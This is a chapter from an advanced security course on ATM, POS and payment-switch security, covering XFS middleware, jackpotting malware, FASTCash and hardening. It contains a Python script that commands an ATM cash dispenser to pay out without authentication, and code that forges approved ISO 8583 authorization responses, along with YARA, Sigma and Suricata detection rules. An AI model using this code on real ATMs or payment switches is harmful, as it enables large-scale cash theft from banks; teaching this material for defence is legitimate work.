---
corso: "Cybersecurity Masterclass"
fase: "Domain 22 — Financial Security"
modulo: "22.2"
titolo: "ATM, POS, and Payment Infrastructure Security"
versione: "CEN/XFS 3.x / ISO 8583:1987 / PCI DSS 4.0.1 / PCI PTS 6.x"
livello: "Advanced"
prerequisiti:
  - "Domain 22 Chapter 22A — EMV Payment Security (APDU, TLV, cryptograms)"
  - "Domain 11 — Malware Analysis (persistence, C2, anti-analysis)"
  - "Domain 14 — Active Directory and Windows Security (lateral movement)"
obiettivi:
  - "Explain the XFS middleware architecture and demonstrate why the lack of API-level authentication enables ATM jackpotting"
  - "Reconstruct the FASTCash attack chain from initial access through ISO 8583 message injection on a compromised payment switch"
  - "Construct and parse ISO 8583 authorization messages, including DE55 EMV TLV extraction and MAC computation"
  - "Write YARA and Sigma detection rules targeting ATM malware families (Ploutus, Cutlet Maker, Tyupkin) and POS RAM scrapers"
  - "Design an ATM hardening program covering BIOS, FDE, application whitelisting, encrypted dispensers, and network segmentation"
tag: [atm, pos, xfs, iso-8583, jackpotting, fastcash, ram-scraper, p2pe, pci-dss, payment-infrastructure]
---

# Domain 22, Chapter 22B — ATM, POS, and Payment Infrastructure Security

> **Learning objectives.** After completing this chapter, the student will be able to: (1) map the full ATM hardware and software stack — from the safe-housed dispenser through XFS Service Providers to the NDC/DDC host protocol — and identify the architectural vulnerability at each layer; (2) analyze ATM jackpotting malware (Ploutus.D, Cutlet Maker, Tyupkin) at the XFS-call level and write detection signatures; (3) reconstruct a FASTCash-style payment-switch compromise, including ISO 8583 message interception and fraudulent response generation; (4) build POS RAM-scraper detection using YARA, Sigma, and Sysmon configurations; (5) design defense-in-depth for payment infrastructure — encrypted dispensers, P2PE, HSM key hierarchies, and fleet behavioral analytics.

> **Scope.** ATM architecture (hardware, Windows OS, XFS middleware — all WFS commands, service providers, manager, security gaps). ATM malware in depth (Ploutus.D activation modes, Cutlet Maker with Stimulator, Tyupkin time-windowed, FASTCash payment-switch compromise with ISO 8583 injection). ATM black-box attacks (dispenser protocol interception, encrypted dispenser defense). ATM skimming and shimming. ISO 8583 message format (MTI, bitmap, all security-relevant data elements, message authentication). POS RAM scrapers (BlackPOS, Dexter, Alina, FrameworkPOS — infection vectors, memory scanning, exfiltration). Track 1/Track 2 format. EMV liability shift mechanics. P2PE architecture. Mobile tokenization (Apple Pay, Google Pay, Samsung Pay — DPAN provisioning, MDES/VTS, cryptogram generation, device binding). PCI DSS/PTS/HSM. Payment fraud detection engineering (velocity checks, ML scoring, 3D-Secure 2.0). ATM/POS detection engineering (Sigma rules for cash-out patterns, XFS abuse, POS scraper behavior, physical tamper correlation; YARA rules for RIPPER, GreenDispenser, WinPot, FrameworkPOS, Backoff, PoSeidon; ISO 8583 field validation). ATM/POS forensics and incident response (XFS journal extraction, EPP key log, NDC log parsing, POS memory acquisition, skimmer forensics, PCI PFI chain of custody, breach notification timeline). Advanced ATM attack techniques (Raspberry Pi black-box kits, NDC protocol manipulation, supply chain attacks, Ploutus variant evolution A–E, FASTCash 1.0/2.0/Windows, malware timeline 2009–2023). Payment infrastructure hardening (XFS API lockdown, application whitelisting, P2PE, network segmentation, PCI DSS v4.0 mapping, EMV kernel hardening, fleet behavioral analytics).

---

## 1. ATM architecture

### 1.1 Hardware components

A modern ATM (NCR SelfServ, Diebold Nixdorf CS-series, Hyosung MX-series) consists of two physical zones:

**The top hat (fascia/upper cabinet).** Contains: the display (15–19" touchscreen LCD), the card reader (motorized, accepts chip cards and optionally contactless — the card is pulled into the ATM to prevent quick grab-and-run), the Encrypting PIN Pad (EPP — a PCI PTS-certified device that encrypts the PIN inside the keypad's tamper-resistant boundary before outputting it), the receipt printer (thermal), speakers, and the main PC (a commodity x86 system — Intel Core i-series or equivalent, 4–8 GB RAM, 128–256 GB SSD, running Windows 10 IoT Enterprise LTSC or Windows 10 IoT LTSB). The top hat is secured with a lock but is generally less physically robust than the safe.

**The safe (lower cabinet).** Contains: the cash dispenser (CDM — Cash Dispenser Module, with 2–4 cassettes, each holding 2,000–3,000 notes; the dispenser mechanism picks, validates, and presents notes), the reject cassette (for notes that fail validation during dispensing — double-feeds, jams, torn notes), and optionally a deposit module (for cash-recycling ATMs — accepts, validates, and stores deposited cash). The safe is a rated security container (UL 291 in the US, CEN 1143 in Europe) with drill-resistant steel, relock devices, and combination/electronic locks.

The PC communicates with the peripherals via internal connections: USB (for the card reader, touchscreen), serial/USB (for the EPP), and a proprietary interface (for the dispenser — typically a serial bus, RS-232, or a proprietary protocol over a physical connection from the PC's I/O board to the dispenser's controller board inside the safe).

### 1.2 The XFS middleware layer

CEN/XFS (eXtensions for Financial Services, standardized as CEN prEN 16684, currently XFS 3.x series) provides a uniform API for ATM peripherals. The architecture:

**XFS Manager (`msxfs.dll`).** The central DLL that routes XFS calls from the application to the correct Service Provider. Applications link against the XFS Manager.

**Service Providers (SPs).** Vendor-specific DLLs that translate XFS commands into hardware-specific commands for each peripheral. NCR, Diebold Nixdorf, and Hyosung each provide their own SPs. SP names follow a convention: `CurrencyDispenser1`, `CardReader1`, `PinPad1`, `ReceiptPrinter1`.

**XFS API calls.** The application opens a session (`WFSOpen`), queries capabilities (`WFSGetInfo`), and sends commands (`WFSExecute` for synchronous, `WFSAsyncExecute` for asynchronous). Key dispenser commands: `WFS_CMD_CDM_DISPENSE` (specify the amount or the number of notes from each cassette), `WFS_CMD_CDM_PRESENT` (present the dispensed notes to the customer via the shutter), `WFS_CMD_CDM_RETRACT` (retract unpicked notes), `WFS_CMD_CDM_REJECT` (reject notes to the reject cassette), and `WFS_INF_CDM_CASH_UNIT_INFO` (query cassette status — denominations, counts, status).

**The security gap.** XFS provides no authentication or authorization layer. Any process on the ATM's Windows OS that can load `msxfs.dll` and call `WFSOpen` + `WFSExecute(WFS_CMD_CDM_DISPENSE)` can command the dispenser to dispense cash. The ATM application is the only software that should call these commands — but the XFS API itself does not enforce this. This architectural weakness is the root cause of all ATM logical attacks.

Some ATM vendors have introduced proprietary authentication layers above XFS (e.g., NCR's Secure Communication between the PC and the dispenser, requiring the PC to authenticate to the dispenser using a shared key before commands are accepted). But these are not part of the XFS standard and are not universally deployed.

### 1.3 XFS exploitation code

The following demonstrates the architectural vulnerability described above. On an ATM running Windows with the XFS Manager installed, any executable can load `msxfs.dll` and issue dispense commands. This Python code uses `ctypes` to call the XFS API directly, bypassing the legitimate ATM application entirely:

```python
import ctypes
from ctypes import wintypes, Structure, POINTER, byref, c_ulong, c_ushort, c_char_p

# Load the XFS Manager DLL
xfs = ctypes.WinDLL("msxfs.dll")

# --- XFS constants ---
WFS_SUCCESS             = 0
WFS_CMD_CDM_DISPENSE    = 302
WFS_CMD_CDM_PRESENT     = 303
WFS_INF_CDM_CASH_UNIT_INFO = 303
WFSOPEN_FLAGS           = 0  # WFS_DEFAULT_HAPP
WFS_INDEFINITE_WAIT     = 0

# --- XFS structures (simplified) ---
class WFSVERSION(Structure):
    _fields_ = [
        ("wVersion",    c_ushort),
        ("wLowVersion", c_ushort),
        ("wHighVersion",c_ushort),
        ("szDescription", ctypes.c_char * 257),
        ("szSystemStatus", ctypes.c_char * 257),
    ]

class WFSRESULT(Structure):
    _fields_ = [
        ("RequestID",   c_ulong),
        ("hService",    c_ushort),
        ("tsTimestamp",  ctypes.c_char * 20),
        ("hResult",     c_ulong),
        ("u",           ctypes.c_void_p),  # union — points to command-specific data
    ]

class WFSCDMDISPENSE(Structure):
    """Maps to the WFS_CMD_CDM_DISPENSE input parameter.
    The attacker specifies the number of notes per cassette or a monetary amount."""
    _fields_ = [
        ("usTellerID",    c_ushort),
        ("usMixNumber",   c_ushort),
        ("fwPosition",    c_ushort),
        ("bCashBox",      ctypes.c_bool),
        ("ulAmount",      c_ulong),     # amount in minor units
        ("usCount",       c_ushort),    # number of cassettes referenced
        ("lpulValues",    POINTER(c_ulong)),  # array: notes per cassette
    ]

# Step 1: Initialize XFS subsystem
ver_required = WFSVERSION()
ver_returned = WFSVERSION()
hr = xfs.WFSStartUp(0x00000003, byref(ver_required))  # request XFS 3.x
assert hr == WFS_SUCCESS, f"WFSStartUp failed: 0x{hr:08X}"

# Step 2: Open a session to the cash dispenser service provider
hService = c_ushort(0)
hr = xfs.WFSOpen(
    b"CurrencyDispenser1",  # logical service name — matches the SP config
    0,                       # hApp (default)
    b"Jackpot",              # application ID — any string works
    0, 0,                    # trace level, timeout flags
    0x00000003,              # SPI version
    byref(ver_required),
    byref(ver_returned),
    byref(hService)
)
assert hr == WFS_SUCCESS, f"WFSOpen failed: 0x{hr:08X}"

# Step 3: Issue a dispense command — 40 notes from cassette 1
note_counts = (c_ulong * 4)(40, 0, 0, 0)  # 40 notes from cassette 1
dispense_params = WFSCDMDISPENSE()
dispense_params.usTellerID  = 0
dispense_params.usMixNumber = 0      # individual cassette selection
dispense_params.fwPosition  = 0x0001 # WFS_CDM_POSNULL — present to customer
dispense_params.ulAmount    = 0      # 0 = use cassette counts, not amount
dispense_params.usCount     = 4
dispense_params.lpulValues  = note_counts

result_ptr = POINTER(WFSRESULT)()
hr = xfs.WFSExecute(
    hService,
    WFS_CMD_CDM_DISPENSE,
    byref(dispense_params),
    WFS_INDEFINITE_WAIT,
    byref(result_ptr)
)
if hr == WFS_SUCCESS:
    # Dispense succeeded — now present the notes at the shutter
    hr = xfs.WFSExecute(
        hService, WFS_CMD_CDM_PRESENT, None,
        WFS_INDEFINITE_WAIT, byref(result_ptr)
    )

# Step 4: Cleanup
xfs.WFSClose(hService)
xfs.WFSCleanUp()
```

The critical observation is that nowhere in this code is any authentication credential, session token, or authorization challenge required. The XFS Manager routes the command to the Service Provider, which relays it to the dispenser hardware. If the dispenser firmware does not implement its own authentication (encrypted dispenser, §2.4), the cash is dispensed unconditionally. This is precisely what ATM jackpotting malware does — the malware is simply a wrapper around these XFS API calls with a user interface for the money mule.

### 1.4 ATM network architecture — NDC/DDC protocols

The ATM communicates with the bank's host (the ATM switch or transaction processor) using one of several protocols:

**NDC/NDC+ (NCR Direct Connect).** NCR's proprietary protocol, the most widely deployed ATM host protocol globally. NDC is a message-based protocol over TCP/IP (historically over X.25 or SNA). The ATM sends transaction request messages to the host, and the host returns "state" commands that tell the ATM what to do next (display a screen, accept PIN input, dispense cash, print a receipt). The host drives the ATM's behavior — the ATM is essentially a thin client that executes host commands. NDC message format: a header (terminal ID, message sequence number, message class), followed by message-class-specific fields (solicited/unsolicited status messages, transaction requests, device fitness messages). The host responds with: "Transaction Reply" messages (specifying dispense amounts, screen buffers, and completion actions) or "State" messages (specifying the next ATM state — idle, card-entry, PIN-entry, transaction-processing). NDC+ extends NDC with enhanced capabilities (multi-currency, deposit modules, improved device management).

**DDC (Diebold Direct Connect).** Diebold's proprietary protocol, functionally similar to NDC. DDC uses a different message format and state model but serves the same purpose — the host controls the ATM's transaction flow.

**ISO 8583 direct.** Some ATM deployments (particularly in Asia-Pacific) use ISO 8583 (§3) directly for ATM-to-host communication, bypassing NDC/DDC. The ATM constructs ISO 8583 authorization messages (MTI `0200` for financial requests) and sends them to the acquirer or switch. This is more common in interbank networks where the ATM must communicate with a shared switch rather than a single bank's host.

**Communication flow.** The typical ATM-to-host path is: ATM → VPN tunnel or leased line → bank's network perimeter → ATM switch/host → core banking system. In older deployments, the ATM connects via dial-up modem or ISDN to the host. Modern deployments use Ethernet (wired broadband or 4G/LTE cellular modems) with an IPsec or TLS VPN tunnel encrypting the NDC/DDC or ISO 8583 traffic. The VPN terminates at the bank's data center, where the ATM switch processes the transaction.

**Protocol-level attack surface.** If the VPN is misconfigured or absent (some ATMs still communicate over unencrypted TCP), an attacker who gains access to the ATM's network segment can intercept and modify NDC/DDC messages. In NDC, the "Transaction Reply" from the host includes the dispense amount — an attacker performing a man-in-the-middle attack could modify the reply to increase the dispense amount. Similarly, the attacker could inject a spoofed "Transaction Reply" to an ATM that has received a legitimate withdrawal request, causing it to dispense more cash than authorized. Defense: mandatory TLS/IPsec for all ATM-to-host communications, mutual authentication (the host authenticates the ATM and vice versa), and MAC-protected NDC messages (some NDC+ implementations support MAC fields on critical messages).

### 1.5 ATM hardening checklist

A comprehensive ATM hardening program addresses every layer of the ATM stack:

**BIOS/UEFI hardening.** Set a strong BIOS password (minimum 12 characters, stored in a hardware-backed password manager accessible only to authorized technicians). Disable boot from USB, CD/DVD, and network (PXE). Enable Secure Boot (validates that only signed bootloaders execute). Disable unused ports in BIOS (serial ports not connected to peripherals, unused USB headers). Set boot order to internal SSD only.

**USB device control.** Deploy a USB device whitelisting solution that permits only the ATM's legitimate USB devices (card reader, touchscreen, EPP) by Vendor ID and Product ID. Block all USB mass storage devices (flash drives, external hard disks). Block USB Human Interface Devices (HID) except the ATM's own touchscreen — this prevents an attacker from connecting a USB keyboard to interact with the Windows desktop. Tools: endpoint protection solutions with device-control modules, Windows Group Policy (`Computer Configuration > Administrative Templates > System > Removable Storage Access > All Removable Storage classes: Deny all access`), or dedicated USB firewall appliances (hardware devices that sit inline on the ATM's USB bus and enforce a whitelist at the electrical level).

**Application whitelisting configuration.** The single most effective defense against ATM malware. Configuration (using McAfee Application Control / Solidcore as the example, since it dominates ATM deployments): enable "solidify" mode after baselining the ATM's legitimate software (the ATM application, XFS Manager, Service Providers, Windows system files, security software). In solidified mode, only executables, scripts, and DLLs present in the baseline can execute. Any new executable — including malware deployed via USB or network — is blocked from running. Critical configuration: disable "software update" mode except during controlled maintenance windows (an attacker who can trigger update mode can bypass the whitelist). Protect the Solidcore configuration with a tamper-proof password. Enable the "memory protection" feature that prevents code injection into whitelisted processes (stops malware that injects DLLs into the ATM application's process space).

**Full-disk encryption.** Encrypt the ATM's SSD with BitLocker (Windows) or a third-party FDE solution (McAfee Drive Encryption, Sophos SafeGuard). Use TPM-based key storage (the ATM's motherboard should have a TPM 2.0 module). FDE prevents an attacker who removes the SSD from reading or modifying its contents offline (e.g., injecting malware onto the filesystem and re-inserting the SSD).

**Network segmentation.** Place ATMs in a dedicated VLAN, isolated from the bank's corporate network, branch workstations, and internet-facing systems. Firewall rules: ATMs should communicate only with the ATM switch (specific IP and port — typically TCP 443 or a custom port for NDC/DDC), the patching/management server (specific IP), and NTP (for clock synchronization). All other traffic — especially outbound internet access — must be blocked. This prevents lateral movement from a compromised ATM to the bank's internal network and prevents malware from exfiltrating data to external C2 servers.

**OS hardening.** Disable Windows Remote Desktop (RDP) unless required for remote management (if required, restrict it to a specific management IP and enforce NLA — Network Level Authentication). Disable unnecessary Windows services (Print Spooler, Windows Search, Windows Update service — patches are deployed by the management server during controlled windows, not via Windows Update). Disable the Windows command prompt and PowerShell for non-administrative accounts (Group Policy: `User Configuration > Administrative Templates > System > Prevent access to the command prompt`). Disable Windows Script Host (`HKLM\Software\Microsoft\Windows Script Host\Settings\Enabled = 0`). Configure Windows Firewall to block all inbound connections except from the management server. Disable autorun/autoplay completely.

**Physical security.** Top-hat lock: upgrade from the standard wafer lock (easily picked) to a high-security lock (Medeco, Abloy Protec) with restricted keyway. Install a top-hat tamper switch (triggers an alarm if the top hat is opened outside of a scheduled maintenance window). Deploy ATM CCTV cameras that capture the fascia area and the surroundings. Anti-skimming devices: jitter mechanisms inside the card reader (vibrate the card during insertion/withdrawal, disrupting overlay skimmers), anti-skimming fascias (a protruding bezel around the card slot that makes overlay placement difficult), and internal card-reader shields (detect foreign objects in the card throat using capacitive or optical sensors).

### 1.6 ATM security testing methodology

A professional ATM penetration test engagement covers the following areas:

**Physical assessment.** Attempt to open the top hat using non-destructive methods (lock picking, key decoding). Assess lock quality and top-hat tamper detection. Inspect the card reader for susceptibility to overlay/deep-insert skimmers. Attempt to access USB, serial, and Ethernet ports. Assess the feasibility of black-box device attachment (can the dispenser cable be reached without safe access?).

**OS and software assessment.** Escape from the ATM application's kiosk mode to the Windows desktop (try key combinations: `Ctrl+Alt+Del`, `Alt+Tab`, `Win` key, `F1` for help dialogs that may offer file-open dialogs). If desktop access is achieved, enumerate installed software, patch levels, application whitelisting status, and local user accounts. Attempt to execute unsigned binaries (test application whitelisting bypass). Check for unencrypted disk (boot from USB — if FDE is absent or misconfigured, the tester gains full filesystem access).

**XFS security assessment.** On an ATM with desktop access (or in a lab environment with an ATM test rig), load a custom XFS test tool and attempt to call `WFS_CMD_CDM_DISPENSE` directly. If the dispense succeeds without authentication, the ATM lacks encrypted dispenser communication — this is a critical finding. Test all XFS peripherals: can the tester command the card reader to eject a card? Can the tester read PIN-pad keystrokes via `WFS_INF_PIN_KEY_INFO`?

**Network assessment.** Intercept ATM-to-host traffic (physically tap the Ethernet cable between the ATM and the network switch). Determine whether traffic is encrypted (TLS/IPsec) or cleartext. If cleartext, analyze NDC/DDC or ISO 8583 messages for sensitive data (PAN, PIN blocks). Attempt man-in-the-middle modification of host responses (change dispense amounts in NDC Transaction Reply messages). Test whether the ATM validates the host's TLS certificate (does a self-signed certificate trigger rejection or is it accepted?).

**Malware resilience assessment.** Deploy a benign test payload (a non-malicious executable that logs XFS API calls) and attempt to execute it. Measure the effectiveness of application whitelisting, AV, and EDR. Attempt DLL injection into the ATM application process. Test whether USB autorun is disabled. Test whether the ATM can be booted from a USB device.

---

## 2. ATM attacks in depth

### 2.1 Ploutus.D

**Infection vector.** Physical access: the attacker opens the top hat (using a key, lock pick, or drill), connects a USB keyboard or USB drive, and boots from the USB drive or uses the keyboard to access the Windows desktop (if autorun or the ATM application doesn't lock the desktop). Alternatively, the attacker connects to the ATM's exposed Ethernet port (some ATMs have an Ethernet jack accessible inside the top hat) and deploys malware over the network.

**Functionality.** Ploutus.D hooks into the ATM application's process or runs as a standalone process. It identifies the installed XFS Service Provider for the dispenser, opens an XFS session, and provides an interface for the operator (a money mule standing at the ATM) to command dispensing. The interface is activated by a specific key sequence on the ATM's function keys (e.g., `F8-F1-F1-F8-F1-F3-F1-F3`). Each key sequence specifies the cassette and the number of notes. Ploutus.D supports NCR, Diebold, and Wincor (now Diebold Nixdorf) dispensers.

**Activation modes.** (1) **Keyboard**: the mule enters the key sequence directly on the ATM's keypad. (2) **Network**: the attacker sends a command over the ATM's network (using a custom protocol — the malware listens on a specific port). (3) **Phone**: the ATM's modem (if present) receives an incoming call; the malware interprets DTMF tones as dispensing commands. (4) **SMS** (some variants): the attacker sends an SMS to a phone connected to the ATM via USB; the malware reads the SMS and interprets it as a command.

**Persistence mechanisms.** Ploutus.D registers itself as a Windows service (service name varies — often disguised as a legitimate-sounding service such as `NCR_ATM_Service` or `SvcATM`). The service is configured with `Start = 2` (automatic startup), ensuring the malware survives reboots. Registry key: `HKLM\SYSTEM\CurrentControlSet\Services\<service_name>`. Some variants also create a scheduled task as a redundant persistence mechanism. Additionally, the malware drops a batch script in the `Startup` folder (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\`) that re-launches the main executable if the service fails to start.

**Detection: YARA rule.** The following YARA rule targets Ploutus.D's characteristic XFS-calling patterns and the specific key-sequence activation mechanism:

```yara
rule Ploutus_D_ATM_Malware {
    meta:
        description = "Detects Ploutus.D ATM jackpotting malware"
        author      = "ATM Security Research"
        date        = "2024-01-15"
        reference   = "Fireeye/Mandiant ATM malware analysis"
    strings:
        $xfs_open       = "WFSOpen" ascii wide
        $xfs_execute    = "WFSExecute" ascii wide
        $xfs_dispense   = "WFS_CMD_CDM_DISPENSE" ascii wide
        $xfs_present    = "WFS_CMD_CDM_PRESENT" ascii wide
        $msxfs_dll      = "msxfs.dll" ascii wide nocase
        $sp_cdm         = "CurrencyDispenser" ascii wide nocase
        $key_seq_f8     = { 46 38 } // "F8" key identifier pattern
        $svc_create     = "CreateServiceA" ascii
        $svc_create_w   = "CreateServiceW" ascii
        $ploutus_str_1  = "Ploutos" ascii wide nocase
        $ploutus_str_2  = "INTCV" ascii wide
    condition:
        uint16(0) == 0x5A4D and  // MZ header
        filesize < 5MB and
        ($msxfs_dll or $sp_cdm) and
        2 of ($xfs_open, $xfs_execute, $xfs_dispense, $xfs_present) and
        (1 of ($svc_create, $svc_create_w) or 1 of ($ploutus_str_1, $ploutus_str_2))
}
```

**Detection: Sigma rule.** This Sigma rule detects behaviors characteristic of ATM malware — specifically, a non-ATM-application process loading `msxfs.dll` or creating a service with an ATM-related name:

```yaml
title: Suspicious XFS DLL Load by Non-ATM Application
id: a3c7e1f0-4b2d-4a9e-8f1c-6d2e3b4a5c6d
status: experimental
description: Detects a process loading msxfs.dll that is not the legitimate ATM application
date: 2024-01-15
logsource:
    category: image_load
    product: windows
detection:
    selection_dll:
        ImageLoaded|endswith: '\msxfs.dll'
    filter_legitimate:
        Image|endswith:
            - '\APTRA\bin\aptra.exe'        # NCR legitimate ATM app
            - '\Agilis\Agilis.exe'           # Diebold legitimate ATM app
            - '\MoniMax\MoniMax.exe'         # Hyosung legitimate ATM app
    condition: selection_dll and not filter_legitimate
level: critical
tags:
    - attack.execution
    - attack.t1106
falsepositives:
    - ATM maintenance tools run by authorized technicians
    - XFS diagnostic utilities during scheduled maintenance
```

### 2.2 Cutlet Maker

A commercially-available ATM jackpotting kit (sold on dark-web forums for approximately $5,000). Components:

**Cutlet Maker (the dispenser tool).** A command-line application that calls XFS commands directly. The operator specifies the cassette number, denomination, and number of notes. Cutlet Maker includes anti-detection features: it checks for the presence of an ATM application (to verify it's running on a real ATM), and it requires a one-time activation code (generated by the "c0decalc" tool) to prevent unauthorized use.

**Stimulator.** A separate application that queries the dispenser's `WFS_INF_CDM_CASH_UNIT_INFO` to enumerate all cassettes — reporting the denomination, note count, and status of each cassette. This tells the operator which cassettes to target (the one with the highest-value notes).

**c0decalc (code generator).** Generates a session-specific activation code. The seller provides c0decalc to the buyer; the buyer generates a code at the ATM and enters it into Cutlet Maker. This prevents the buyer from reselling the tool (the codes are tied to the seller's keying).

**Reverse-engineering the activation code.** The c0decalc code generation is based on a time-limited HMAC. Cutlet Maker reads the current system time (rounded to a configurable window, typically 30 minutes) and the ATM's hardware identifier (derived from the dispenser's serial number, obtained via `WFS_INF_CDM_CASH_UNIT_INFO`). It concatenates these values and computes an HMAC-SHA256 using a key embedded in c0decalc. The resulting hash is truncated to 8 digits — this is the activation code. The operator calls the seller (or uses c0decalc on a separate device), provides the ATM hardware ID and current time, and receives the 8-digit code. Analysts who extract the embedded HMAC key from c0decalc can generate codes independently, which is how researchers have documented the kit's operation without purchasing it from the seller.

**Detection signatures.** Cutlet Maker's Stimulator component enumerates dispenser cassettes in a pattern distinct from normal ATM operation — it calls `WFS_INF_CDM_CASH_UNIT_INFO` repeatedly without any associated card-reader or PIN-pad activity. The following Sigma rule captures this anomaly:

```yaml
title: ATM Cassette Enumeration Without Transaction Context
id: b4d8f2a1-5c3e-4b0f-9a2d-7e3f4c5b6a7d
status: experimental
description: Detects repeated cash-unit-info queries without associated card/PIN activity
date: 2024-01-15
logsource:
    product: windows
    service: application
detection:
    selection_xfs_query:
        EventID: 1000
        Message|contains: 'WFS_INF_CDM_CASH_UNIT_INFO'
    filter_card_activity:
        Message|contains:
            - 'WFS_CMD_IDC_READ'
            - 'WFS_CMD_PIN_GET_PIN'
    timeframe: 5m
    condition: selection_xfs_query | count() > 3 and not filter_card_activity
level: high
```

### 2.3 FASTCash (Lazarus Group / DPRK)

FASTCash is fundamentally different from other ATM attacks — it does not compromise the ATM itself. Instead, the attackers compromise the bank's **payment switch** (the server that processes ISO 8583 authorization requests from ATMs and routes them to the core banking system).

**Attack chain.** (1) Initial access to the bank's IT network (spear-phishing, vulnerability exploitation). (2) Lateral movement to the payment switch (typically an AIX or Linux server running the bank's switching software). (3) Deployment of a malicious library (a shared object — `.so` file) that intercepts ISO 8583 messages processed by the switch. (4) The malicious library monitors incoming authorization requests (MTI `0100` — authorization request). When it sees a request from a PAN on the attackers' list (accounts controlled by the attackers, with low or zero balances), it generates a fake authorization response (MTI `0110`, DE39 = `00` — approved) and returns it to the ATM, bypassing the core banking system entirely. (5) The ATM receives the approved response and dispenses cash.

The attackers' mules withdraw cash from ATMs across multiple countries simultaneously. Because the fake authorization response comes from the compromised switch (not from the core banking system), the core banking system has no record of the transaction. The bank discovers the loss when it reconciles ATM dispensing logs against core banking transaction records.

FASTCash has been attributed to DPRK's Lazarus Group (US-CERT Alert TA18-275A, October 2018) and has targeted banks in Africa, Asia, and Latin America, with total losses estimated at hundreds of millions of dollars. The FBI and CISA released a joint advisory (AA20-239A) documenting the attack's evolution in 2020, noting that FASTCash 2.0 variants targeted Linux-based payment switches in addition to the original AIX targets.

**ISO 8583 message manipulation — technical reconstruction.** The following Python code demonstrates how the malicious `.so` intercepts and modifies ISO 8583 messages on the payment switch. This uses the `py8583` library to illustrate the message construction logic the malware implements at the C/binary level:

```python
"""
FASTCash attack reconstruction — ISO 8583 message interception on
a compromised payment switch.  The malicious .so hooks the switch's
message-processing function, inspects incoming MTI 0100 requests,
and generates fraudulent MTI 0110 responses for target PANs.
"""
from py8583 import ISO8583, DT, LT, ContentType

# --- Target PAN list (loaded from an encrypted config file
# that the attackers deploy alongside the malicious .so) ---
TARGET_PANS = {
    "4111111111111111",
    "5222222222222222",
    # ... dozens to hundreds of mule-controlled PANs
}

# ISO 8583 field specification (1987 version, common on ATM switches)
SPEC = {
    2:  {"ContentType": ContentType.N,  "MaxLen": 19, "LenType": LT.LLVAR,  "Description": "PAN"},
    3:  {"ContentType": ContentType.N,  "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "Processing Code"},
    4:  {"ContentType": ContentType.N,  "MaxLen": 12, "LenType": LT.FIXED,  "Description": "Amount"},
    11: {"ContentType": ContentType.N,  "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "STAN"},
    12: {"ContentType": ContentType.N,  "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "Time"},
    13: {"ContentType": ContentType.N,  "MaxLen": 4,  "LenType": LT.FIXED,  "Description": "Date"},
    22: {"ContentType": ContentType.N,  "MaxLen": 3,  "LenType": LT.FIXED,  "Description": "POS Entry Mode"},
    25: {"ContentType": ContentType.N,  "MaxLen": 2,  "LenType": LT.FIXED,  "Description": "POS Condition Code"},
    35: {"ContentType": ContentType.Z,  "MaxLen": 37, "LenType": LT.LLVAR,  "Description": "Track 2"},
    38: {"ContentType": ContentType.AN, "MaxLen": 6,  "LenType": LT.FIXED,  "Description": "Auth Code"},
    39: {"ContentType": ContentType.AN, "MaxLen": 2,  "LenType": LT.FIXED,  "Description": "Response Code"},
    41: {"ContentType": ContentType.ANS,"MaxLen": 8,  "LenType": LT.FIXED,  "Description": "Terminal ID"},
    42: {"ContentType": ContentType.ANS,"MaxLen": 15, "LenType": LT.FIXED,  "Description": "Merchant ID"},
    55: {"ContentType": ContentType.B,  "MaxLen": 999,"LenType": LT.LLLVAR, "Description": "EMV Data"},
}

def intercept_authorization(raw_request: bytes) -> bytes | None:
    """Called by the hooked message-processing function for every
    incoming ISO 8583 message.  Returns a fraudulent response if
    the PAN is on the target list, or None to let the message pass
    through to the real core banking system."""

    req = ISO8583(raw_request, SPEC)
    mti = req.getMTI()

    # Only intercept authorization requests
    if mti != "0100":
        return None

    pan = req.getBit(2)
    if pan not in TARGET_PANS:
        return None   # not a target — let the real switch handle it

    # Build a fraudulent authorization response
    resp = ISO8583(IsoSpec=SPEC)
    resp.setMTI("0110")                       # authorization response
    resp.setBit(2,  pan)                       # echo PAN
    resp.setBit(3,  req.getBit(3))             # echo processing code
    resp.setBit(4,  req.getBit(4))             # echo amount
    resp.setBit(11, req.getBit(11))            # echo STAN
    resp.setBit(12, req.getBit(12))            # echo time
    resp.setBit(13, req.getBit(13))            # echo date
    resp.setBit(25, req.getBit(25))            # echo POS condition
    resp.setBit(38, "A12345")                  # fabricated auth code
    resp.setBit(39, "00")                      # APPROVED
    resp.setBit(41, req.getBit(41))            # echo terminal ID
    resp.setBit(42, req.getBit(42))            # echo merchant ID

    return resp.getNetworkISO()
```

The real malware operates at the binary level — it is compiled as a shared library (`.so` on AIX or Linux) and injected into the switch process using `LD_PRELOAD` or by replacing a legitimate library in the switch's library path. The interception function hooks the switch's `recv()` or `read()` system call (or the switch application's internal message-dispatch function, identified through reverse engineering) and inspects every incoming message before the switch processes it.

**Network-level detection rules.** The following Suricata rule detects the primary anomaly pattern: an ISO 8583 authorization response (MTI `0110`) with approval code (`DE39 = 00`) where the response time is near-zero (the fraudulent response is generated locally on the compromised switch, not after a round-trip to the core banking system — response latency drops from the normal 200–2000ms to under 5ms):

```
alert tcp $SWITCH_NET any -> $ATM_NET any (
    msg:"FASTCASH - Suspicious instant ISO8583 authorization response";
    flow:established,to_client;
    content:"0110";  offset:0; depth:4;   # MTI 0110
    content:"00";                          # DE39 = approved (within response)
    detection_filter:track by_dst, count 5, seconds 60;
    metadata:attack_target payment_switch, severity critical;
    sid:2024001; rev:1;
)
```

A complementary Sigma rule for the host-based detection on the switch server itself watches for the `.so` injection:

```yaml
title: FASTCash Malicious Shared Library on Payment Switch
id: c5e9f3b2-6d4f-4c1a-ab3e-8f4g5d6e7f8a
status: experimental
description: Detects LD_PRELOAD injection or unexpected .so files in switch library paths
date: 2024-01-15
logsource:
    product: linux
    category: process_creation
detection:
    selection_preload:
        CommandLine|contains: 'LD_PRELOAD'
        Image|endswith: '/switch_process'
    selection_new_lib:
        TargetFilename|endswith: '.so'
        TargetFilename|contains:
            - '/lib/libswitch'
            - '/opt/switch/lib'
    condition: selection_preload or selection_new_lib
level: critical
tags:
    - attack.persistence
    - attack.t1574.006
```

